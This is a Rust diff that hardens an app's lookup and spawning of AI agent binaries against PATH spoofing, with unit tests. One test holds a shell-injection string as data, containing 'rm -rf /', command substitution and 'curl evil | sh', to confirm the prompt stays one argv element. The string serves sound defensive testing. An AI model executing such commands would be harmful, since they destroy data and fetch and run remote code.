@@ -161,13 +161,49 @@ fn agent_for(id: AgentId) -> Option<Box<dyn Agent>> {
 /// Aggressive PATH-extending search for a binary. Looks in PATH plus a list
 /// of well-known fallback locations because GUI apps on macOS inherit a thin
 /// PATH that misses Homebrew, mise, asdf, npm-global, ~/.claude/local, etc.
+///
+/// Security: the resolved binary must be an **absolute** path that exists on
+/// disk. We reject any candidate that resolves relative to the current working
+/// directory — a `.`, empty, or otherwise relative `PATH` entry would
+/// otherwise let an attacker who controls the active vault cwd drop a
+/// malicious `claude`/`codex` executable that we'd then spawn. The `binary`
+/// argument itself is also rejected if it contains a path separator, so a
+/// caller can never smuggle in a traversal or absolute override.
 pub fn which(binary: &str) -> Option<PathBuf> {
     use std::env;
+    use std::path::Component;
+
+    // Defense-in-depth: callers pass bare binary names ("claude", "codex").
+    // A name containing a separator (or `.`/`..`) is not a thing we look up on
+    // PATH — refuse it rather than join it onto every candidate dir.
+    if binary.is_empty()
+        || Path::new(binary)
+            .components()
+            .any(|c| !matches!(c, Component::Normal(_)))
+    {
+        return None;
+    }
+
+    // Only accept a candidate that is an absolute path to an existing file.
+    // This drops cwd-relative PATH entries (`.`, "", "foo/bar") which are the
+    // spoofing vector when the cwd is attacker-controlled.
+    let accept = |p: PathBuf| -> Option<PathBuf> {
+        if p.is_absolute() && p.is_file() {
+            Some(p)
+        } else {
+            None
+        }
+    };
 
     let mut candidates: Vec<PathBuf> = Vec::new();
 
     if let Ok(p) = env::var("PATH") {
         for dir in env::split_paths(&p) {
+            // Skip empty / relative PATH entries entirely; only absolute
+            // directories may contribute a candidate.
+            if dir.as_os_str().is_empty() || !dir.is_absolute() {
+                continue;
+            }
             candidates.push(dir.join(binary));
         }
     }
@@ -197,7 +233,7 @@ pub fn which(binary: &str) -> Option<PathBuf> {
         candidates.push(PathBuf::from(p).join(binary));
     }
 
-    candidates.into_iter().find(|p| p.is_file())
+    candidates.into_iter().find_map(accept)
 }
 
 #[tauri::command]
@@ -270,6 +306,17 @@ pub async fn start_ai_session(
     };
     if let Some(b) = &broker {
         b.wire(&mut cmd);
+    }
+
+    // Never spawn a relative program name: `Command::new("claude")` would
+    // perform its own cwd-then-PATH resolution, reopening the spoofing vector
+    // that `which()` closes. The binary must be the absolute path that
+    // `detect()` resolved.
+    if !cmd.binary.is_absolute() {
+        return Err(AppError::Io(format!(
+            "refusing to spawn {}: resolved binary is not an absolute path",
+            agent.label()
+        )));
     }
 
     // stdin → /dev/null so the agent doesn't block waiting for input. Some
@@ -399,4 +446,89 @@ pub fn add_permission_rule(
 ) -> Result<bool> {
     let broker = app.state::<AgentSession>().broker.lock().unwrap().clone();
     Ok(broker.map(|b| b.add_allow_rule(&tool, path_prefix.as_deref())).unwrap_or(false))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// A `binary` name with a path separator or traversal component is never a
+    /// PATH lookup — it must be rejected so it can't smuggle in an absolute
+    /// override or `../` traversal.
+    #[test]
+    fn which_rejects_binary_names_with_path_components() {
+        assert!(which("").is_none());
+        assert!(which("../claude").is_none());
+        assert!(which("/usr/bin/claude").is_none());
+        assert!(which("foo/bar").is_none());
+        assert!(which(".").is_none());
+    }
+
+    /// A relative or empty `PATH` entry (which would resolve against the
+    /// attacker-controlled cwd) must never produce a spawnable candidate, even
+    /// if a matching file exists in the current directory.
+    #[test]
+    fn which_ignores_relative_path_entries() {
+        use std::fs;
+
+        let tmp = std::env::temp_dir().join(format!("mdwriter-which-{}", std::process::id()));
+        fs::create_dir_all(&tmp).unwrap();
+        // Plant an executable-looking file under a relative dir name.
+        let rel_dir = "mdwriter_evil_bin";
+        let evil_dir = tmp.join(rel_dir);
+        fs::create_dir_all(&evil_dir).unwrap();
+        let evil = evil_dir.join("totally-unique-binary-xyz");
+        fs::write(&evil, b"#!/bin/sh\n").unwrap();
+
+        // PATH set to a *relative* entry plus an empty entry. Neither is
+        // absolute, so `which` must skip both and find nothing.
+        let saved = std::env::var_os("PATH");
+        std::env::set_var("PATH", format!("{rel_dir}:"));
+        let found = which("totally-unique-binary-xyz");
+        match saved {
+            Some(p) => std::env::set_var("PATH", p),
+            None => std::env::remove_var("PATH"),
+        }
+        let _ = fs::remove_dir_all(&tmp);
+
+        assert!(
+            found.is_none(),
+            "relative/empty PATH entries must not yield a candidate, got {found:?}"
+        );
+    }
+
+    /// Anything `which` returns is an absolute path to an existing file, so the
+    /// spawn-site `is_absolute()` guard is always satisfiable by a real lookup.
+    #[test]
+    fn which_results_are_absolute_existing_files() {
+        // `sh` exists on every unix CI runner under an absolute fallback dir.
+        if let Some(p) = which("sh") {
+            assert!(p.is_absolute(), "{p:?} should be absolute");
+            assert!(p.is_file(), "{p:?} should be a file");
+        }
+    }
+
+    /// Arguments are carried as a discrete argv vector, never interpolated into
+    /// a shell string. A prompt full of shell metacharacters must survive as a
+    /// single positional element so no command/argument injection is possible.
+    #[test]
+    fn build_command_keeps_prompt_as_single_argv_element() {
+        let agent = claude_code::ClaudeCodeAgent;
+        let nasty = "hi; rm -rf / `whoami` $(echo pwned) && curl evil | sh";
+        let cmd = agent.build_command(
+            Path::new("/abs/claude"),
+            Path::new("/vault"),
+            nasty,
+            PermissionMode::AcceptEdits,
+        );
+        // The exact, untouched prompt is exactly one element of argv.
+        assert_eq!(
+            cmd.args.iter().filter(|a| a.as_str() == nasty).count(),
+            1,
+            "prompt must appear verbatim as a single argv element: {:?}",
+            cmd.args
+        );
+        // And it is the final positional, after the `--` option terminator.
+        assert_eq!(cmd.args.last().map(String::as_str), Some(nasty));
+    }
 }
